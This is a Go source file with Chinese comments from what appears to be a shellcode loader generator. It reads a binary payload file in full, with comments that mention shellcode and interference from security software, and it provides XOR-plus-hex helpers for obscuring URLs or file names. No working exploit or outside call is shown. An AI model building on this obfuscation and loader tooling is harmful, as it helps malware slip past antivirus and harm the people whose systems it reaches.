package encode

import (
	"encoding/hex"
	"fmt"
	"io"
	"os"
)

// maxBinFileSize 单文件读取上限（防止异常大文件把内存吃光）。
const maxBinFileSize = 200 << 20 // 200MB

// OpenBinToByte 读取二进制文件内容；失败返回 error（由调用方处理，不再直接退出进程）。
//
// 历史 bug：这里曾用单次 file.Read(data) 读取。os.File.Read 是「至多读满」语义，
// 一次系统调用完全可能返回 n < len(data)（大文件、被安全软件实时扫描/锁定的文件尤为常见），
// 且返回 n < len 时 err 为 nil，于是载荷尾部被静默补零 —— 生成的 loader 带着残缺 shellcode，
// 表现为「偶尔处理失败/产物跑不起来」且无任何报错。此处改用 io.ReadAll 读满，
// 并对长度做严格校验。
func OpenBinToByte(filePath string) ([]byte, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, fmt.Errorf("打开文件失败: %w", err)
	}
	defer file.Close()

	// 获取文件大小
	stat, err := file.Stat()
	if err != nil {
		return nil, fmt.Errorf("获取文件信息失败: %w", err)
	}
	fileSize := stat.Size()
	if fileSize > maxBinFileSize {
		return nil, fmt.Errorf("文件过大")
	}

	// 一次性读满（LimitReader 兜底，防止读取过程中文件被追加导致内存膨胀）
	data, err := io.ReadAll(io.LimitReader(file, maxBinFileSize+1))
	if err != nil {
		return nil, fmt.Errorf("读取文件失败: %w", err)
	}
	if int64(len(data)) != fileSize {
		return nil, fmt.Errorf("文件读取不完整: 期望 %d 字节，实际 %d 字节（可能被安全软件拦截或文件正在被写入）", fileSize, len(data))
	}

	// 返回原始字节数组，而不是格式化的字符串
	return data, nil
}

// xorURL 对URL进行异或加密
func XorURLOrFileName(url string, key byte) string {
	result := make([]byte, len(url))
	for i := 0; i < len(url); i++ {
		result[i] = url[i] ^ key
	}
	return hex.EncodeToString(result)
}

// unxorURL 对异或加密的URL进行解密
func UnxorURLOrFileName(hexStr string, key byte) (string, error) {
	encrypted, err := hex.DecodeString(hexStr)
	if err != nil {
		return "", err
	}

	result := make([]byte, len(encrypted))
	for i := 0; i < len(encrypted); i++ {
		result[i] = encrypted[i] ^ key
	}
	return string(result), nil
}
